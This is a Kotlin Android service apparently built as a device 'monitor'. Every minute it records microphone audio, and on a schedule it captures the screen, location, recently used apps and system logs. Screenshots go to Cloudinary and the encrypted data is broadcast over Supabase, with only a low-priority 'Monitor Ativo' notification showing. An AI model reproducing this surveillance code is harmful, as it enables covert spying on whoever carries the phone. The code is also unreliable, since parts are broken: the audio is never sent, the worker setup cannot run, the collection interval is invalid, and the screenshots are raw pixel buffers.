// CollectorService.kt
package com.universidade.monitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import io.github.jan.supabase.realtime.broadcast
import kotlinx.coroutines.*
import kotlinx.serialization.json.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class CollectorService : Service() {

    companion object {
        private const val CHANNEL_ID = "collector_channel"
        private const val NOTIFICATION_ID = 1001
        private const val COLLECT_INTERVAL = 30000L // 30 segundos
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var powerManager: PowerManager
    private lateinit var wakeLock: PowerManager.WakeLock
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private lateinit var imageReader: ImageReader
    private lateinit var mediaRecorder: MediaRecorder
    private var isRecording = false
    private val audioFiles = mutableListOf<File>()

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Monitor:WakeLock")
        wakeLock.acquire()

        setupMediaProjection()
        setupAudioRecorder()
        scheduleCollection()
        startContinuousAudioCapture()
    }

    private fun setupMediaProjection() {
        val prefs = getSharedPreferences("monitor", MODE_PRIVATE)
        val resultCode = prefs.getInt("screen_capture_result", -1)
        val dataUri = prefs.getString("screen_capture_data", null)

        if (resultCode != -1 && dataUri != null) {
            try {
                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = projectionManager.getMediaProjection(
                    resultCode,
                    Intent.parseUri(dataUri, 0)
                )

                imageReader = ImageReader.newInstance(
                    resources.displayMetrics.widthPixels,
                    resources.displayMetrics.heightPixels,
                    PixelFormat.RGBA_8888,
                    2
                )

                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenCapture",
                    resources.displayMetrics.widthPixels,
                    resources.displayMetrics.heightPixels,
                    resources.displayMetrics.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.surface,
                    null,
                    null
                )
            } catch (e: Exception) {
                Log.e("Collector", "Erro setup MediaProjection", e)
            }
        }
    }

    private fun setupAudioRecorder() {
        try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioBitRate(128000)
            }
        } catch (e: Exception) {
            Log.e("Collector", "Erro setup áudio", e)
        }
    }

    private fun startContinuousAudioCapture() {
        serviceScope.launch {
            while (true) {
                try {
                    captureAudio()
                } catch (e: Exception) {
                    Log.e("Collector", "Erro captura áudio", e)
                }
                delay(60000) // A cada 1 minuto
            }
        }
    }

    private suspend fun captureAudio() {
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val audioFile = File(cacheDir, "audio_$timestamp.m4a")
            
            mediaRecorder.apply {
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
                isRecording = true
            }
            
            delay(5000) // Grava por 5 segundos
            
            mediaRecorder.stop()
            mediaRecorder.reset()
            isRecording = false
            
            audioFiles.add(audioFile)
            Log.d("Collector", "Áudio capturado: ${audioFile.length()} bytes")
            
        } catch (e: Exception) {
            Log.e("Collector", "Erro captura áudio", e)
        }
    }

    private suspend fun captureScreen(): String? {
        return try {
            val image = imageReader.acquireLatestImage() ?: return null
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()
            
            // Converte para Base64
            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e("Collector", "Erro capturando tela", e)
            null
        }
    }

    private suspend fun getLocation(): JsonObject {
        return try {
            val location = fusedLocationClient.lastLocation.await()
            if (location != null) {
                buildJsonObject {
                    put("lat", location.latitude)
                    put("lng", location.longitude)
                    put("accuracy", location.accuracy)
                    put("timestamp", location.time)
                }
            } else {
                buildJsonObject { put("error", "Localização indisponível") }
            }
        } catch (e: Exception) {
            buildJsonObject { put("error", e.message ?: "Erro GPS") }
        }
    }

    private fun getRunningApps(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                val endTime = System.currentTimeMillis()
                val startTime = endTime - 60000 // Último minuto
                
                val stats = usageStatsManager.queryUsageStats(
                    android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                    startTime,
                    endTime
                )
                
                val appList = mutableListOf<String>()
                stats?.sortedByDescending { it.lastTimeUsed }?.take(10)?.forEach {
                    try {
                        val appName = packageManager.getApplicationLabel(
                            packageManager.getApplicationInfo(it.packageName, 0)
                        ).toString()
                        appList.add(appName)
                    } catch (e: Exception) {
                        appList.add(it.packageName.substringAfterLast("."))
                    }
                }
                appList.joinToString(", ")
            } else {
                ""
            }
        } catch (e: Exception) {
            Log.e("Collector", "Erro apps", e)
            ""
        }
    }

    private fun getLogs(): String {
        return try {
            val process = Runtime.getRuntime().exec("logcat -d -t 30")
            process.inputStream.bufferedReader().readText().take(500)
        } catch (e: Exception) {
            ""
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level != -1 && scale != -1) (level * 100 / scale) else -1
        } catch (e: Exception) {
            -1
        }
    }

    private fun getNetworkInfo(): String {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val networkInfo = connectivityManager.activeNetworkInfo
            networkInfo?.typeName ?: "N/A"
        } catch (e: Exception) {
            "N/A"
        }
    }

    private suspend fun collectAllData(): JsonObject {
        val clientId = getSharedPreferences("monitor", MODE_PRIVATE)
            .getString("client_id", "unknown") ?: "unknown"

        val screenshotBase64 = captureScreen() ?: ""
        var screenshotUrl = ""
        if (screenshotBase64.isNotEmpty()) {
            screenshotUrl = CloudinaryManager.uploadImageBase64(screenshotBase64, clientId) ?: ""
        }

        return buildJsonObject {
            put("type", "data")
            put("client_id", clientId)
            put("timestamp", System.currentTimeMillis())
            put("screenshot_url", screenshotUrl)
            put("location", getLocation())
            put("apps", getRunningApps())
            put("logs", getLogs())
            put("battery", getBatteryLevel())
            put("network", getNetworkInfo())
        }
    }

    private suspend fun sendData(data: JsonObject) {
        try {
            val dadosJson = SupabaseManager.json.encodeToString(data)
            val dadosCriptografados = CriptografiaManager.criptografar(dadosJson)

            SupabaseManager.broadcastData("monitor:data", mapOf(
                "dados" to dadosCriptografados,
                "client_id" to data["client_id"]?.jsonPrimitive?.contentOrNull.orEmpty()
            ))
            Log.d("Collector", "Dados enviados")
        } catch (e: Exception) {
            Log.e("Collector", "Erro ao enviar dados", e)
        }
    }

    private fun scheduleCollection() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val collectWork = PeriodicWorkRequestBuilder<CollectWorker>(COLLECT_INTERVAL, TimeUnit.MILLISECONDS)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "collect_work",
            ExistingPeriodicWorkPolicy.REPLACE,
            collectWork
        )
    }

    inner class CollectWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
        override suspend fun doWork(): Result {
            return try {
                val data = collectAllData()
                sendData(data)
                Result.success()
            } catch (e: Exception) {
                Log.e("CollectWorker", "Erro", e)
                Result.retry()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        wakeLock.release()
        virtualDisplay?.release()
        mediaProjection?.stop()
        if (isRecording) {
            mediaRecorder.stop()
            mediaRecorder.release()
        }
        audioFiles.forEach { it.delete() }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitor Coletor",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Monitor Ativo")
            .setContentText("Coletando dados...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}